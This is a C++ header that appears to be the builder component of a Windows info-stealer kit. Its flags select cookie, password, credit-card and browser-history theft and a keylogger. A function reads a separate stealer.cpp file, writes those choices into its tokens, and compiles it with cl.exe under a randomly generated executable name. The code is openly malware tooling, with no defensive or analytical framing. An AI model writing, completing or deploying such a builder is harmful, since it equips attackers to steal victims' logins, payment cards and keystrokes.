#include <fstream>
#include <sstream>
#include <iostream>
#include <string>
#include <cstdlib>   // For system() and std::remove
#include <ctime>
#include <random>
#include <windows.h>

namespace Vars
{
    inline bool bActivateStaler = false;
    inline bool bGrabCookies = false;
    inline bool bGrabPasswords = false;
    inline bool bStartKeylogger = false;
    inline bool bEndKeylogger = false;
    inline bool bGrabCreditCards = false;
    inline bool bGrabHistory = false;

    // Helper function: generates a random alphanumeric string.
    inline std::string GenerateRandomName(size_t length = 10)
    {
        static const char charset[] =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        static std::mt19937 rng{ std::random_device{}() };
        static std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);

        std::string result;
        for (size_t i = 0; i < length; i++)
        {
            result += charset[dist(rng)];
        }
        return result;
    }

    // This function reads "stealer.cpp", replaces tokens based on the flag values,
    // writes the modified source to a temporary file, and then invokes the compiler.
    inline bool BuildStealerExe()
    {
        // Only build if the stealer is activated.
        if (!bActivateStaler)
        {
            MessageBoxA(NULL, "[Build] Stealer not activated; build aborted.", "Build", MB_OK | MB_ICONERROR);
            return false;
        }

        // Read the original source code from stealer.cpp
        std::ifstream srcFile("C:\\Users\\leode\\source\\repos\\bitmem\\bitmem\\stealer.cpp");
        if (!srcFile.is_open())
        {
            MessageBoxA(NULL, "[Build] Error: Could not open stealer.cpp", "Build", MB_OK | MB_ICONERROR);
            return false;
        }
        std::stringstream buffer;
        buffer << srcFile.rdbuf();
        std::string sourceCode = buffer.str();
        srcFile.close();

        // Helper lambda to perform all occurrences replacement in the source string.
        auto replaceAll = [](std::string& str, const std::string& from, const std::string& to)
            {
                size_t startPos = 0;
                while ((startPos = str.find(from, startPos)) != std::string::npos)
                {
                    str.replace(startPos, from.length(), to);
                    startPos += to.length();
                }
            };

        // Replace tokens in the source code based on our flags.
        // (Make sure your stealer.cpp has tokens like "*GRAB_COOKIES*" etc.)
        replaceAll(sourceCode, "*GRAB_COOKIES*", (bGrabCookies ? "1" : "0"));
        replaceAll(sourceCode, "*GRAB_PASSWORDS*", (bGrabPasswords ? "1" : "0"));
        replaceAll(sourceCode, "*START_KEYLOGGER*", (bStartKeylogger ? "1" : "0"));
        replaceAll(sourceCode, "*GRAB_HISTORY*", (bGrabHistory ? "1" : "0"));
        replaceAll(sourceCode, "*GRAB_CREDIT_CARDS*", (bGrabCreditCards ? "1" : "0"));

        // Ensure the temp file path is absolute
        std::string tempSourceFile = "C:\\Users\\leode\\source\\repos\\bitmem\\bitmem\\temp_stealer.cpp";
        std::ofstream outFile(tempSourceFile);
        if (!outFile.is_open())
        {
            MessageBoxA(NULL, "[Build] Error: Could not create temporary source file.", "Build", MB_OK | MB_ICONERROR);
            return false;
        }
        outFile << sourceCode;
        outFile.close();

        // Generate an output executable name (randomized).
        std::string outputFileName = GenerateRandomName() + ".exe";

        // Build the command string to invoke the compiler.
        // This example uses cl.exe (Visual Studio's compiler). Adjust flags as needed.
        std::string compileCommand = "cl /EHsc C:\\Users\\leode\\source\\repos\\bitmem\\bitmem\\temp_stealer.cpp /Fe:C:\\Users\\leode\\source\\repos\\bitmem\\bitmem\\" + outputFileName;

        // Show compile command for debugging
        std::string compileMsg = "[Build] Compiling with command: " + compileCommand;
        MessageBoxA(NULL, compileMsg.c_str(), "Build", MB_OK | MB_ICONINFORMATION);

        // Invoke the compiler via system().
        int compileResult = system(compileCommand.c_str());
        if (compileResult != 0)
        {
            std::string compileErrMsg = "[Build] Compilation failed with error code: " + std::to_string(compileResult);
            MessageBoxA(NULL, compileErrMsg.c_str(), "Build", MB_OK | MB_ICONERROR);
            return false;
        }

        // Optional: You can remove the temporary source file after the build if needed.
        // std::remove(tempSourceFile.c_str());

        // Show success message
        std::string successMsg = "[Build] Build successful! Executable created: " + outputFileName;
        MessageBoxA(NULL, successMsg.c_str(), "Build", MB_OK | MB_ICONINFORMATION);
        return true;
    }
}
